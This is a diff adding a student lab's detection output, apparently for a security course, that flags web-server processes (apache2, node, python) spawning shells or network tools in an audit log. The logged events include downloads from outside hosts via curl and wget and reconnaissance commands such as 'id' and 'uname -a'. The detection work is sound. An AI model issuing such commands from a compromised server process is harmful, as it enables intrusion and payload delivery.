@@ -1,0 +1,14 @@
+﻿# Deteccion sobre laboratorio/logs/audit.log - Grupo 07
+
+# A) Filtro de scripts/detectar.sh: padre apache2|php-fpm|node|python -> hijo sh|bash|curl|wget|nc
+# Formato: numero de linea + evento
+ 6  2026-10-27T09:42:17Z host=web01 ppid=812 ppid_comm=apache2 pid=903 comm=sh args="sh -c id"
+ 9  2026-10-27T09:43:03Z host=api01 ppid=501 ppid_comm=node pid=601 comm=sh args="sh -c curl http://198.51.100.7/x"
+14  2026-10-27T09:44:22Z host=web01 ppid=812 ppid_comm=apache2 pid=906 comm=wget args="wget http://198.51.100.9/a"
+16  2026-10-27T09:45:10Z host=svc01 ppid=701 ppid_comm=python pid=704 comm=sh args="sh -c uname -a"
+
+# B) Procesos lanzados por los hijos de A (no los detecta el filtro A)
+# Criterio: ppid igual al pid de un evento de A (903, 601, 906, 704)
+ 7  2026-10-27T09:42:18Z host=web01 ppid=903 ppid_comm=sh pid=904 comm=id args="id"
+10  2026-10-27T09:43:04Z host=api01 ppid=601 ppid_comm=sh pid=602 comm=curl args="curl http://198.51.100.7/x"
+17  2026-10-27T09:45:11Z host=svc01 ppid=704 ppid_comm=sh pid=705 comm=uname args="uname -a"
